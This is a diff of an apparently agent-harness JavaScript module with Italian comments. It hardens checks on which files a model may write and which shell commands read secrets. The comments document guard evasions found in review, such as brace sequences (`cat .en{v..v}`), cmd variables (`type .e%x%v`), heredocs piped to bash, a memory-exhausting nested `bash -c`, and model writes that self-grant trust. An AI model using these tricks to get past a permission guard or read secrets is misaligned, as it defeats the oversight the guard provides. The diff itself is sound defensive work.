@@ -16,6 +16,7 @@ import { dirname, isAbsolute, join, posix, relative, resolve, sep } from 'node:p
 
 import { existsSync as esisteSync, readdirSync as elencaSync, realpathSync as realpathSyncNativa, statSync as statSyncNativa, lstatSync as lstatSyncNativa, readlinkSync as readlinkSyncNativa, openSync as apriSync, readSync as leggiSync, closeSync as chiudiSync, fstatSync as fstatSyncNativa } from 'node:fs';
 import { formaDiSegretoNelTesto } from './forme-di-segreto.mjs';
+import { createHash } from 'node:crypto';
 import { homedir, hostname } from 'node:os';
 import { basename as nomeBase, dirname as cartellaDi, parse as parsePercorso, relative as relativoA, resolve as risolvi, sep as separatore } from 'node:path';
 
@@ -45,14 +46,18 @@ function homeDiSistema() {
  * progetto che si chiama `skills` non deve diventare tutto intoccabile.
  */
 export const FILE_DI_CONTROLLO = Object.freeze({
-  file: Object.freeze(['.harness-ui-hooks.json', '.harness-ui-mcp.json', '.provider-runtime.json', 'CLAUDE.md', 'AGENTS.md']),
+  // ⛔ 06/11/2026 (decisione 310, revisione dei permessi del computer use): la scelta «Uso del computer» e i luoghi decidono se il modello
+  //   può guidare lo schermo. Una scrittura del modello lì accenderebbe il computer use al riavvio senza carta: controllo come le altre.
+  file: Object.freeze(['.harness-ui-hooks.json', '.harness-ui-mcp.json', '.provider-runtime.json', '.computer-use-impostazione.json', '.computer-use-luoghi.json', 'CLAUDE.md', 'AGENTS.md']),
   // ⛔ 14/09 (F01/F02 della review, verificato): `.mcp-trust` e `.plugin-trust` sono i registri dove vivono i consensi ai
   //   server MCP e ai plugin (session-registry.mjs), esattamente come `.hooks-trust`. Mancavano da questo elenco: senza,
   //   un attrezzo di scrittura del modello poteva scriverci dentro e AUTO-CONCEDERSI la fiducia. `ePercorsoDiControllo`
   //   risolve già il realpath, quindi la classificazione vale anche per un alias/symlink verso queste cartelle.
   // ⭐ PO-26, parte 2 (24/09/2026): `.talos/` è la cartella della configurazione del progetto (hook, MCP, plugin, skill),
   //   quindi è controllo per intero, come `.claude/`.
-  cartelleOvunque: Object.freeze(['.harness-ui-plugins', '.hooks-trust', '.mcp-trust', '.plugin-trust', '.claude', '.memory-store', '.talos']),
+  // ⛔ 04/11/2026 (revisione del blocco permessi, aggiornamento 17:02 del brief 155): `.harness-ui-skills` è la cartella delle skill
+  //   del progetto (`configurazione-progetto.mjs:27` la legge accanto a `.talos/skills`), quindi controllo come le altre, fuori dall'Accesso pieno.
+  cartelleOvunque: Object.freeze(['.harness-ui-plugins', '.harness-ui-skills', '.hooks-trust', '.mcp-trust', '.plugin-trust', '.claude', '.memory-store', '.talos']),
   cartelleAllaRadice: Object.freeze(['skills']),
 });
 
@@ -70,30 +75,106 @@ function percorsoRealeAncheSeManca(assoluto, realpathFn) {
 }
 
 /**
+ * ⭐ 04/11/2026 — DECISIONE 151 DELL'OWNER: LE COPIE DI LAVORO DI CLAUDE CODE SONO PROGETTO, NON REGOLE.
+ * Reperto: foto dell'owner delle 16:16, sessione in Accesso pieno, carta «It wants to write a TALOS control file…» su
+ * `OrcaOne/.claude/worktrees/nfc-lf/orca-rs/crates/orca-lfrfid/tests/firmware.rs`: `.claude` sta in `cartelleOvunque`, quindi
+ * ogni file della copia chiedeva.
+ * Fonti (04/11/2026):
+ *   - code.claude.com/docs/en/worktrees: «the worktree is created under `.claude/worktrees/<name>/` at your repository root»;
+ *     e l'esempio di `WorktreeCreate` che le mette in `$HOME/.claude/worktrees/$NAME` ⇒ la regola vale anche FUORI dal progetto.
+ *   - code.claude.com/docs/en/permission-modes, «Protected paths»: `.claude` è protetta «with a few exceptions, such as Claude's
+ *     own git worktrees under `.claude/worktrees/`» — la stessa eccezione, nello stesso punto.
+ *   - Codex (clone 01/11, `codex-rs/protocol/src/permissions.rs:40-51`): `.git`, `.agents`, `.codex` protette solo come primo
+ *     segmento di ogni radice scrivibile ⇒ le regole di una copia si cercano ALLA SUA RADICE, come per il progetto.
+ *   - Hermes (clone 01/11, `agent/file_safety.py:251-252`): sotto la sua casa protegge sottocartelle precise, non tutto.
+ * La regola: dentro `.claude/worktrees/<nome>/…` i tre segmenti `.claude`, `worktrees`, `<nome>` non contano più; il RESTO si
+ * giudica come un progetto (nomi di controllo ovunque, cartelle ovunque, `skills/` alla radice della copia) e in più il `.git`
+ * della copia (file `gitdir:` o cartella) resta controllo per intero (condizione 3 del Desktop: cambiarlo fa eseguire codice al
+ * prossimo git della persona). Restano controllo `.claude/worktrees` stessa, ciò che le sta direttamente sotto e la cartella della
+ * copia; una seconda `.claude` dentro la copia è la `.claude` della copia, quindi controllo.
+ */
+const COPIE_DI_LAVORO = Object.freeze({ cartella: '.claude', sotto: 'worktrees' });
+
+/**
+ * L'indice del `.claude` di `.claude/worktrees/<nome>/<qualcosa>`, il primo che si trova; -1 se il percorso non è dentro una copia.
+ * ⛔ Un `<nome>` che comincia col punto (`.talos`, `.git`, `.claude`…) non è una copia: Claude Code le chiama `feature-auth`,
+ *   `bright-running-fox`, `pr-1234` (doc «worktrees»), e una cartella nascosta lì sotto resta controllo come oggi.
+ */
+function inizioDellaCopia(segmenti) {
+  for (let i = 0; i + 3 < segmenti.length; i += 1) {
+    if (segmenti[i] === COPIE_DI_LAVORO.cartella && segmenti[i + 1] === COPIE_DI_LAVORO.sotto && !segmenti[i + 2].startsWith('.')) return i;
+  }
+  return -1;
+}
+
+/**
+ * ⛔ Condizione 4 della CLI: su Windows (e sul disco di serie del Mac) `.GIT/Config` È `.git/config`. Lì il confronto si fa
+ * senza maiuscole, per TUTTA la funzione: aggiunge carte, non ne toglie nessuna che oggi c'è.
+ */
+function confrontoPer(piattaforma) {
+  return piattaforma === 'win32' || piattaforma === 'darwin' ? (s) => s.toLowerCase() : (s) => s;
+}
+
+/**
  * True se `percorso` (relativo al workspace o assoluto) tocca un file di
  * controllo. ⛔ Confronto sul percorso REALE: `../`, symlink e junction
  * che puntano a uno di quei file non lo aggirano. Mai un'eccezione: un
  * percorso che non si riesce a risolvere torna `true` (fallisce chiuso —
  * meglio una card di troppo che una regola riscritta in silenzio).
+ * ⛔ 04/11 (condizione 1 di Performance sulla 151): nessuna risoluzione in più per file — le copie si giudicano sui segmenti del
+ *   percorso reale già calcolato qui.
+ * ⛔ 04/11/2026, decisione 155 dell'owner: la decisione 152 (`.git/hooks`, `.git/config` e il puntatore `gitdir:` come file di
+ *   controllo) è ANNULLATA e le sue righe sono tolte. In Accesso pieno questa funzione non si chiama nemmeno (il cancello del
+ *   registro, `costruisciCancelloFileDiControllo`); nelle altre modalità `.git` torna libero com'era prima della 152, tranne il
+ *   `.git` di una copia di lavoro (condizione 3 della 151, sotto).
  */
-export function ePercorsoDiControllo(cartella, percorso, { realpathFn = realpathSyncNativa } = {}) {
+export function ePercorsoDiControllo(cartella, percorso, { realpathFn = realpathSyncNativa, piattaforma = process.platform } = {}) {
   if (typeof cartella !== 'string' || cartella.length === 0 || typeof percorso !== 'string' || percorso.length === 0) return false;
   let radice;
   let reale;
   try {
     radice = percorsoRealeAncheSeManca(risolvi(cartella), realpathFn);
-    reale = percorsoRealeAncheSeManca(risolvi(cartella, percorso), realpathFn);
+    /* R1 della revisione del blocco permessi (04/11/2026): su NTFS `CLAUDE.md::$DATA` È `CLAUDE.md` (e `.claude::$INDEX_ALLOCATION`
+       è la cartella `.claude`), quindi il nome dello stream si toglie PRIMA del confronto. */
+    const scritto = risolvi(cartella, percorso);
+    reale = percorsoRealeAncheSeManca(piattaforma === 'win32' ? senzaStreamNtfs(scritto) : scritto, realpathFn);
   } catch {
     return true;
   }
-  if (FILE_DI_CONTROLLO.file.includes(nomeBase(reale))) return true;
+  const uguale = confrontoPer(piattaforma);
+  const nome = uguale(nomeBase(reale));
+  if (FILE_DI_CONTROLLO.file.some((f) => uguale(f) === nome)) return true;
+  const ovunque = FILE_DI_CONTROLLO.cartelleOvunque.map(uguale);
+  const allaRadice = FILE_DI_CONTROLLO.cartelleAllaRadice.map(uguale);
   const relativo = relativoA(radice, reale);
   const dentro = relativo !== '' && !relativo.startsWith('..') && !relativo.includes(`..${separatore}`);
-  const segmenti = (dentro ? relativo : reale).split(/[\\/]+/).filter(Boolean);
+  const segmenti = (dentro ? relativo : reale).split(/[\\/]+/).filter(Boolean).map(uguale);
   const cartelle = segmenti.slice(0, -1);
-  if (cartelle.some((s) => FILE_DI_CONTROLLO.cartelleOvunque.includes(s))) return true;
-  if (dentro && cartelle.length > 0 && FILE_DI_CONTROLLO.cartelleAllaRadice.includes(cartelle[0])) return true;
+  const copia = inizioDellaCopia(segmenti);
+  const esente = (k) => copia >= 0 && k >= copia && k <= copia + 2;
+  if (cartelle.some((s, k) => !esente(k) && ovunque.includes(s))) return true;
+  if (dentro && cartelle.length > 0 && allaRadice.includes(cartelle[0])) return true;
+  if (copia >= 0) {
+    const radiceDellaCopia = copia + 3;
+    if (segmenti[radiceDellaCopia] === '.git') return true; // condizione 3 della 151: il `.git` della copia resta controllo per intero
+    if (radiceDellaCopia < cartelle.length && allaRadice.includes(cartelle[radiceDellaCopia])) return true;
+  }
   return false;
+}
+
+/**
+ * R1 (04/11/2026): ogni segmento perde ciò che segue il primo `:` (il nome dello stream NTFS e il suo tipo), tranne la lettera del
+ * disco in testa. Come Hermes, che rifiuta i due punti in ogni componente perché su Windows aprono uno stream alternativo
+ * (`tools/skills_hub_models.py:219-222`, clone 01/11). Nessuna lettura del disco: è solo testo.
+ */
+function senzaStreamNtfs(percorso) {
+  let disco = true; // la lettera del disco è il primo pezzo vero, anche dopo `\\?\` o `\\.\`
+  return percorso.split(/([\\/])/u).map((pezzo) => {
+    if (pezzo === '' || pezzo === '/' || pezzo === '\\' || pezzo === '?' || pezzo === '.') return pezzo;
+    const tieni = disco && /^[A-Za-z]:$/u.test(pezzo);
+    disco = false;
+    return tieni ? pezzo : pezzo.replace(/:.*$/su, '');
+  }).join('');
 }
 
 /**
@@ -483,12 +564,34 @@ function decodificaAnsiC(s) {
   return fuori;
 }
 
+/*
+ * ⛔ F2 dei buchi della guardia (revisione di Performance, 03/11/2026 notte, S2): le variabili di cmd non diventavano un jolly, mentre `${f}` sì, e Windows è la
+ *   piattaforma principale. `cmd /c "set x=bigli&& node %x%etto-talos.mjs"`, `cmd /v /c "… !x!etto…"` e `node %X%iglietto-talos.mjs` lanciavano il comando dei biglietti
+ *   senza carta. Nella lettura di cmd e PowerShell (`variabiliDiCmd`, accesa insieme a `barraDiWindows`) diventano il jolly: `%nome%` (anche `%nome:~0,3%` e
+ *   `%nome:a=b%`), `!nome!` (l'espansione ritardata di `cmd /v`), gli argomenti `%1`, `%~dp0`, `%*` e le variabili del `for` nei file batch (`%%i`). Microsoft Learn,
+ *   «cmd» (aggiornata il 22/10/2025): `%VariableName%` si sostituisce col valore, `/v:on` abilita `!`. Claude Code 2.1.317 fa la stessa lettura in più
+ *   («with cmd's %NAME% variables replaced», `claude.exe` offset 310048877); lui sostituisce i valori dell'ambiente, qui il valore non si sa e vale il jolly.
+ * ⛔ `%HOME%` e `%USERPROFILE%` restano scritti: `conLaHomeEspansa` li riconosce come la casa. ⛔ Resta fuori, detto: la variabile del `for` scritta a mano con un `%`
+ *   solo (`for %i in (…) do node %i…`), perché `%s`, `%d` e `%Y` dei formati (`date +%Y`, `printf "%s"`) diventerebbero tutti un jolly.
+ */
+const VARIABILE_DI_CMD = /%(?:[A-Za-z_][^%\s=:]*(?::[^%\s]*)?%|~[A-Za-z]*[0-9*]|[0-9*]|%[A-Za-z])|![A-Za-z_][^!\s=:]*(?::[^!\s]*)?!/uy;
+function variabileDiCmd(t, i) {
+  VARIABILE_DI_CMD.lastIndex = i;
+  const trovata = VARIABILE_DI_CMD.exec(t);
+  if (!trovata) return null;
+  return { testo: /^%(?:HOME|USERPROFILE)%$/iu.test(trovata[0]) ? trovata[0] : JOLLY, fine: i + trovata[0].length - 1 };
+}
+
 /** Il testo fra doppi apici a partire da `da` (dopo l'apice): toglie gli escape che bash toglie lì, `$..` e apici inversi diventano il jolly. */
-function dentroDoppie(t, da) {
+function dentroDoppie(t, da, { variabiliDiCmd = false } = {}) {
   let fuori = '';
   for (let i = da; i < t.length; i += 1) {
     const c = t[i];
     if (c === '"') return { testo: fuori, fine: i };
+    if (variabiliDiCmd && (c === '%' || c === '!')) {
+      const variabile = variabileDiCmd(t, i);
+      if (variabile) { fuori += variabile.testo; i = variabile.fine; continue; }
+    }
     if (c === '\\' && i + 1 < t.length) {
       const n = t[i + 1];
       if (n === '\n') { i += 1; continue; }
@@ -538,7 +641,7 @@ function espansione(t, i) {
  * Una graffa `{a,b}` e un gruppo extglob `@(a|b)` restano UNA parola. Ogni parola porta `chiamata`: subito dopo c'è `(` e finisce con una lettera, come
  * `s.key()` (un metodo, non un file: ticket C-005). Dichiarato: non è un parser di shell; i corpi di heredoc si tolgono prima.
  */
-function paroleDellaShell(testo, { barraDiWindows = false } = {}) {
+function paroleDellaShell(testo, { barraDiWindows = false, variabiliDiCmd = false } = {}) {
   const t = String(testo ?? '');
   const parole = [];
   let corrente = '';
@@ -547,12 +650,15 @@ function paroleDellaShell(testo, { barraDiWindows = false } = {}) {
   /* F-P-004c (12/10/2026): ogni parola porta anche il COMANDO del suo segmento (la prima parola dopo `;`, `&`, `|`, `(`, `)` o a capo),
      così chi la giudica sa se quel comando legge i file o stampa soltanto i suoi argomenti. */
   let comando = null;
+  /* blocco dopo (S3 della revisione di Performance, 04/11/2026): e il numero del segmento, così chi rilegge il codice di un interprete prende solo le parole del suo
+     segmento (`bash -c "echo 0" && bash -c "echo 1"` sono due comandi, non uno dentro l'altro) */
+  let segmento = 0;
   const chiudi = (separatore) => {
     if (corrente !== '') {
       if (comando === null) comando = corrente;
-      parole.push({ testo: corrente, chiamata: separatore === '(' && /[A-Za-z0-9_]$/u.test(corrente), comando });
+      parole.push({ testo: corrente, chiamata: separatore === '(' && /[A-Za-z0-9_]$/u.test(corrente), comando, segmento });
     }
-    if (/[;&|()\n]/u.test(separatore)) comando = null;
+    if (/[;&|()\n]/u.test(separatore)) { comando = null; segmento += 1; }
     corrente = ''; graffe = 0; tonde = 0;
   };
   for (let i = 0; i < t.length; i += 1) {
@@ -574,7 +680,11 @@ function paroleDellaShell(testo, { barraDiWindows = false } = {}) {
       corrente += n; i += 1; continue;
     }
     if (c === "'") { const fine = t.indexOf("'", i + 1); if (fine === -1) { corrente += t.slice(i + 1); break; } corrente += t.slice(i + 1, fine); i = fine; continue; }
-    if (c === '"') { const r = dentroDoppie(t, i + 1); corrente += r.testo; i = r.fine; continue; }
+    if (c === '"') { const r = dentroDoppie(t, i + 1, { variabiliDiCmd }); corrente += r.testo; i = r.fine; continue; }
+    if (variabiliDiCmd && (c === '%' || c === '!')) {
+      const variabile = variabileDiCmd(t, i);
+      if (variabile) { corrente += variabile.testo; i = variabile.fine; continue; }
+    }
     if (c === '$') { const r = espansione(t, i); corrente += r.testo; i = r.fine; continue; }
     if (c === '`') { const fine = t.indexOf('`', i + 1); corrente += JOLLY; i = fine === -1 ? t.length : fine; continue; }
     if (c === '^' && !corrente.endsWith('[')) continue;
@@ -626,6 +736,54 @@ function espandiGraffe(parola) {
     if (finiti.length + daFare.length > TETTI_GLOB_SEGRETI.alternative) return { parole: finiti, troppe: true };
   }
   return { parole: finiti, troppe: false };
+}
+
+/*
+ * ⛔ Il buco dei segreti (revisione di Performance, 03/11/2026 notte, S3, c'era già prima di N11): `cat .env` chiedeva, `cat .en{v..v}` e `cat .e{m..o}v` no. Una
+ *   sequenza non ha virgole, quindi `espandiGraffe` la lasciava com'era e il nome scritto non era più `.env`. Ma bash la espande per prima, come le graffe a virgola
+ *   (manuale, §3.5.1 «Brace Expansion»: `{x..y[..incr]}`, x e y interi o lettere). ⇒ La sequenza si scrive per esteso, come la scrive bash: `.en{v..v}` è `.env`,
+ *   `.e{m..o}v` è `.emv`, `.env`, `.eov`. Interi anche negativi, gli zeri davanti allargano tutte le forme (`{01..03}`), il segno del passo non conta: le stesse regole di
+ *   `braceSequence` in mvdan/sh (`expand/braces.go:134-200`). Una sequenza scritta male, più lunga del tetto delle alternative o che darebbe `,` `{` `}` `\` o uno spazio
+ *   vale il jolly, come in N11: un insieme più largo, mai più stretto.
+ * ⛔ Una funzione sola per la guardia dei biglietti e per il controllo dei segreti (`formeDellaParola`): la stessa grammatica, nessuna seconda lista da tenere allineata.
+ */
+function formeDellaSequenza(dentro) {
+  const m = /^(?:(-?\d+)\.\.(-?\d+)|([A-Za-z])\.\.([A-Za-z]))(?:\.\.(-?\d+))?$/u.exec(dentro);
+  if (!m) return null;
+  const numeri = m[1] !== undefined;
+  const da = numeri ? Number(m[1]) : m[3].codePointAt(0);
+  const a = numeri ? Number(m[2]) : m[4].codePointAt(0);
+  const passo = Math.abs(Number(m[5] ?? 1)) || 1;
+  if (!Number.isSafeInteger(da) || !Number.isSafeInteger(a) || !Number.isSafeInteger(passo)) return null;
+  if (Math.floor(Math.abs(a - da) / passo) + 1 > TETTI_GLOB_SEGRETI.alternative) return null;
+  const larghezza = numeri && (/^-?0\d/u.test(m[1]) || /^-?0\d/u.test(m[2])) ? Math.max(m[1].length, m[2].length) : 0;
+  const forme = [];
+  const su = da <= a;
+  for (let n = da; su ? n <= a : n >= a; n += su ? passo : -passo) {
+    const forma = !numeri ? String.fromCodePoint(n) : n < 0 ? `-${String(-n).padStart(larghezza - 1, '0')}` : String(n).padStart(larghezza, '0');
+    if (/[,{}\\\s]/u.test(forma)) return null;
+    forme.push(forma);
+  }
+  return forme;
+}
+/** Ogni `{x..y}` senza graffe dentro, scritta per esteso (`{a,b,c}`, o la sola forma), o il jolly se non si può. */
+function conLeSequenzeEspanse(parola, { comeJolly = false } = {}) {
+  return parola.replace(/\{([^{}\s]*?\.\.[^{}\s]*?)\}/gu, (_, dentro) => {
+    const forme = comeJolly ? null : formeDellaSequenza(dentro);
+    if (forme === null) return JOLLY;
+    return forme.length === 1 ? forme[0] : `{${forme.join(',')}}`;
+  });
+}
+/**
+ * Le forme di UNA parola dopo le graffe, come le fa bash: sequenze e virgole. Se le sequenze scritte per esteso superano il tetto (`{a..z}{a..z}` sono 676 forme) si
+ * riprova con le sequenze come jolly, che è la lettura di N11: così `mkdir {a..z}{a..z}` non diventa una carta. `testo` è la parola con le sequenze già trattate.
+ */
+function formeDellaParola(parola) {
+  const esatte = conLeSequenzeEspanse(parola);
+  const prima = espandiGraffe(esatte);
+  if (!prima.troppe || esatte === parola) return { ...prima, testo: esatte };
+  const larghe = conLeSequenzeEspanse(parola, { comeJolly: true });
+  return { ...espandiGraffe(larghe), testo: larghe };
 }
 
 const CLASSI_POSIX = Object.freeze({
@@ -834,14 +992,39 @@ function candidatiDelGlob(parola, { home, cartella, elenca, puntiNascosti, bilan
  * un heredoc che alimenta una SHELL (`bash <<'X'`), e un corpo senza virgolette che contiene `$(..)` o apici inversi (si eseguono).
  * Un heredoc che non si chiude non si tocca.
  */
+/*
+ * ⛔ R4 della revisione del blocco permessi (04/11/2026, su S6): la shell si cercava solo PRIMA del `<<`, e il `<<` anche nei commenti e
+ *   fra virgolette. `cat <<'X' | bash` (il corpo va a una shell DOPO il delimitatore) e `# <<'X'` (nessun heredoc: le righe dopo sono
+ *   comandi veri) toglievano il corpo e con lui il tetto «troppo complesso». Ora il `<<` conta solo fuori dalle virgolette e prima di un
+ *   commento, e una pipe verso una shell dopo il delimitatore vuol dire «heredoc che alimenta una shell». Come Hermes, che tiene i corpi
+ *   di shell («shell execution via heredoc», `tools/approval_detection.py:440-442` e `:1010-1011`, clone 01/11), e come il pavimento
+ *   dei comandi qui, che salta i commenti con `eInizioCommento` (`kernel/pavimento-comandi.mjs:133`). Nel dubbio il corpo resta: si
+ *   chiede come prima di S6, solo fuori dall'Accesso pieno.
+ */
+const SHELL_DOPO_UNA_PIPE = /\|&?.*(?:^|[\s\\/|;&(])(?:(?:ba|z|da|k|c|fi|a)?sh|pwsh|powershell|cmd)(?:\.exe)?(?=$|[\s;|&)])/iu;
+function heredocDellaRiga(riga) {
+  let apice = '';
+  for (let j = 0; j < riga.length; j += 1) {
+    const c = riga[j];
+    if (apice) { if (c === apice) apice = ''; continue; }
+    if (c === "'" || c === '"') { apice = c; continue; }
+    if (c === '#' && (j === 0 || /[\s;|&(]/u.test(riga[j - 1]))) return null;
+    if (c === '<' && riga[j + 1] === '<' && riga[j + 2] !== '<' && riga[j - 1] !== '<') {
+      const trovato = /^<<-?\s*(['"]?)([A-Za-z_][\w-]*)\1/u.exec(riga.slice(j));
+      if (trovato) return { index: j, fine: j + trovato[0].length, 1: trovato[1], 2: trovato[2] };
+    }
+  }
+  return null;
+}
 function senzaCorpiDiHeredoc(testo) {
   const righe = String(testo ?? '').split('\n');
   const fuori = [];
   for (let i = 0; i < righe.length; i += 1) {
     const riga = righe[i];
     fuori.push(riga);
-    const heredoc = riga.match(/<<-?\s*(['"]?)([A-Za-z_][\w-]*)\1/u);
+    const heredoc = heredocDellaRiga(riga);
     if (!heredoc || /\b(?:ba|z|da|k|c|fi|a)?sh\b|\bpwsh\b|\bpowershell\b|\bcmd\b/iu.test(riga.slice(0, heredoc.index))) continue;
+    if (SHELL_DOPO_UNA_PIPE.test(riga.slice(heredoc.fine))) continue;
     let fine = -1;
     for (let k = i + 1; k < righe.length; k += 1) if (righe[k].trim() === heredoc[2]) { fine = k; break; }
     if (fine === -1) continue;
@@ -887,12 +1070,41 @@ function sostituzioniDiComando(t) {
  */
 const INTERPRETI_SHELL = new Set(['sh', 'bash', 'zsh', 'dash', 'ksh', 'mksh', 'fish']);
 const OPZIONE_CODIFICATA_PS = /^-(?:e|ec|en|enc|enco|encod|encode|encoded|encodedc|encodedco|encodedcom|encodedcomm|encodedcomma|encodedcomman|encodedcommand)$/iu;
+/*
+ * ⛔ Buchi della guardia (03/11/2026 notte, misurato sul codice di beec27135): ogni interprete trovato ricopiava TUTTO il resto del comando, e `'bash -c '.repeat(20000)`
+ *   (160 mila caratteri) esauriva i 4 GB di memoria del processo, cioè fermava il server di tutte le sessioni; con 2.000 ripetizioni ci voleva quasi un secondo.
+ *   ⇒ Al più `INTERPRETI_MASSIMI` testi annidati per livello; oltre, la lista porta `troppi` e chi la usa chiede. Un comando vero ne ha uno o due.
+ */
+const INTERPRETI_MASSIMI = 16;
+const NOMI_CHE_RILEGGONO = new Set(['iex', 'invoke-expression', 'powershell', 'pwsh', 'cmd']);
+/* la stessa forma di `VARIABILE_DI_CMD`, cercata ovunque: c'è almeno una variabile di cmd? */
+const UNA_VARIABILE_DI_CMD = new RegExp(VARIABILE_DI_CMD.source, 'u');
+const haVariabiliDiCmd = (testo) => UNA_VARIABILE_DI_CMD.test(testo);
 function comandiDegliInterpreti(testo) {
-  const parole = paroleDellaShell(testo).map((p) => p.testo);
+  const lette = paroleDellaShell(testo);
+  const parole = lette.map((p) => p.testo);
   const interni = [];
   for (let i = 0; i < parole.length; i += 1) {
+    if (interni.length >= INTERPRETI_MASSIMI) {
+      const fuori = interni.filter((x) => x.trim() !== '');
+      fuori.troppi = true;
+      return fuori;
+    }
     const nome = nomeDelComando(parole[i]);
-    const resto = parole.slice(i + 1);
+    if (!INTERPRETI_SHELL.has(nome) && !NOMI_CHE_RILEGGONO.has(nome)) continue;
+    /* il resto si copia solo per un interprete: copiarlo per ogni parola costava un tempo quadratico (2 secondi su 200 mila caratteri, misurati) */
+    /*
+     * ⛔ Blocco dopo (S3 della revisione di Performance su 62b70c142, 04/11/2026): il resto è solo il SEGMENTO dell'interprete, fino al primo `;` `&` `|` `(` `)`
+     *   o a capo fuori dagli apici. Prima era tutto il resto della riga, e `bash -c "echo 0" && bash -c "echo 1" && …` cinque volte diventava cinque livelli
+     *   uno dentro l'altro: oltre il quarto si chiedeva, e cinque comandi innocui davano una carta. Il separatore lo consuma la shell di FUORI prima di lanciare
+     *   l'interprete (bash, manuale 3.2.4; `cmd /?`: `&&` fuori dagli apici); ciò che sta dopo si legge comunque al primo livello. Gli argomenti dopo il testo
+     *   (`$0`, `$1` di bash, le parole che PowerShell unisce al `-Command`) restano nel segmento, come prima. ⛔ Resta, detto: oltre `INTERPRETI_MASSIMI`
+     *   interpreti nello stesso testo si chiede ancora. Fonti: `FONTI-GUARDIA-BLOCCO-DOPO-2026-11-04.md` (bash «Invoking Bash», about_Pwsh,
+     *   `CommandLineParameterParser.cs:1617`, Codex `bash.rs:106-119`, mvdan/sh `nodes.go:363-366`).
+     */
+    let fine = i + 1;
+    while (fine < lette.length && lette[fine].segmento === lette[i].segmento) fine += 1;
+    const resto = parole.slice(i + 1, fine);
     if (INTERPRETI_SHELL.has(nome)) {
       /*
        * Riverifica del bugfixer (16/10/2026 notte): bash esegue il primo argomento che NON è un'opzione dopo `-c` (`bash -c -- '…'`,
@@ -945,13 +1157,17 @@ function nominaUnSegretoPerGlob(testo, { home, cartella, elenca, puntiNascosti, 
   const esempio = (percorso) => esempioConUnaChiave(percorso, { cartella, home, ...(leggiTesta ? { leggiTesta } : {}) });
   const bilancio = ereditato ?? { cartelle: 0, nomi: 0, cache: new Map(), orologio, scadenza: orologio() + TETTI_GLOB_SEGRETI.millisecondi };
   /* v5: prima i comandi dentro le sostituzioni (al massimo quattro livelli: oltre, si chiede) */
-  for (const interno of [...sostituzioniDiComando(senzaCorpiDiHeredoc(testo)), ...comandiDegliInterpreti(senzaCorpiDiHeredoc(testo))]) {
-    if (profondita >= 4) return { classe: 'segreto', percorso: interno.slice(0, 120) };
+  const degliInterpreti = comandiDegliInterpreti(senzaCorpiDiHeredoc(testo));
+  /* buchi della guardia: oltre il tetto degli interpreti (`bash -c ` ripetuto ventimila volte esauriva la memoria del server) si chiede */
+  /* blocco dopo (punto 3): ogni uscita da un tetto porta `perche: 'troppo-complesso'`, e la carta lo dice; il `percorso` resta quello di prima, e la chiave del consenso porta il perché (decisione 107) */
+  if (degliInterpreti.troppi) return { classe: 'segreto', percorso: String(testo).trim().slice(0, 120), perche: 'troppo-complesso' };
+  for (const interno of [...sostituzioniDiComando(senzaCorpiDiHeredoc(testo)), ...degliInterpreti]) {
+    if (profondita >= 4) return { classe: 'segreto', percorso: interno.slice(0, 120), perche: 'troppo-complesso' };
     const trovato = nominaUnSegreto(interno, { home }) ?? nominaUnSegretoPerGlob(interno, { home, cartella, elenca, puntiNascosti, orologio, bilancio, profondita: profondita + 1 });
     if (trovato) return trovato;
   }
   /* il jolly non si mostra a una persona: al suo posto `…` */
-  const prudente = (parola) => ({ classe: 'segreto', percorso: parola.split(JOLLY).join('…') });
+  const prudente = (parola) => ({ classe: 'segreto', percorso: parola.split(JOLLY).join('…'), perche: 'troppo-complesso' });
   /*
    * F-P-004 (S1, stress test della CLI 0.5.5, 12/10/2026): `type .\.e*v` e `type keys\id_*` leggevano i segreti, perché la sola lettura di bash
    * fa di `\` un escape (`..e*v`, `keysid_*`), mentre cmd e PowerShell lo usano come separatore. Lo stesso testo si legge nelle DUE grammatiche
@@ -959,13 +1175,15 @@ function nominaUnSegretoPerGlob(testo, { home, cartella, elenca, puntiNascosti, 
    */
   const senzaHeredoc = senzaCorpiDiHeredoc(testo);
   const letture = paroleDellaShell(senzaHeredoc);
-  if (senzaHeredoc.includes('\\')) letture.push(...paroleDellaShell(senzaHeredoc, { barraDiWindows: true }));
-  for (const { testo: parola, chiamata, comando } of letture) {
+  /* F2 dei buchi della guardia (03/11/2026 notte): la lettura di cmd e PowerShell serve anche quando c'è una variabile di cmd (`type .e%x%v`), e lì la variabile vale il jolly */
+  if (senzaHeredoc.includes('\\') || haVariabiliDiCmd(senzaHeredoc)) letture.push(...paroleDellaShell(senzaHeredoc, { barraDiWindows: true, variabiliDiCmd: true }));
+  for (const { testo: scritta, chiamata, comando } of letture) {
     if (chiamata) continue;
+    /* buchi della guardia (S3): le sequenze `{x..y}` si scrivono per esteso prima di tutto, come in bash e come nella guardia dei biglietti (`formeDellaParola`) */
+    const { parole, troppe, testo: parola } = formeDellaParola(scritta);
     /* una parola che è SOLO una sostituzione (`$FILE`, `"$X"`) può valere qualunque cosa: non si chiede per lei (dichiarato), solo per quelle che
        hanno almeno due caratteri scritti di loro (`.e${X}nv`, `${X}env`) */
     if (parola.includes(JOLLY) && parola.split(JOLLY).join('').replace(/[*?[\]/]/gu, '').length < 2) continue;
-    const { parole, troppe } = espandiGraffe(parola);
     if (troppe) return prudente(parola);
     for (const p of parole) {
       if (!eUnGlob(p)) {
@@ -1023,9 +1241,9 @@ export function nominaUnSegreto(testo, {
   }
   /* C-005 terzo giro (08/10/2026): solo per un comando di shell, dopo il passo sul testo, e solo se c'è una graffa o un carattere jolly.
      v5: anche se c'è un apice, una barra rovescia, un `$`, un apice inverso o `^` (cmd): la shell li toglie o li sostituisce prima di aprire il file. */
-  if (espandi && (/[*?[{'"\\$`^]|[@+!]\(/u.test(intero) || comandiDegliInterpreti(intero).length > 0)) {
+  if (espandi && (/[*?[{'"\\$`^]|[@+!]\(/u.test(intero) || haVariabiliDiCmd(intero) || comandiDegliInterpreti(intero).length > 0)) {
     /* Un modulo dentro un cancello di sicurezza non lancia: se il passo dei glob si rompe per un motivo che non so, CHIEDE (mai in silenzio). */
-    try { return nominaUnSegretoPerGlob(intero, { home, cartella, elenca, puntiNascosti, orologio, ...(leggiTesta ? { leggiTesta } : {}) }); } catch { return { classe: 'segreto', percorso: intero.trim().slice(0, 120) }; }
+    try { return nominaUnSegretoPerGlob(intero, { home, cartella, elenca, puntiNascosti, orologio, ...(leggiTesta ? { leggiTesta } : {}) }); } catch { return { classe: 'segreto', percorso: intero.trim().slice(0, 120), perche: 'troppo-complesso' }; }
   }
   return null;
 }
@@ -1149,8 +1367,11 @@ function eDiRete(percorso) {
 
 /**
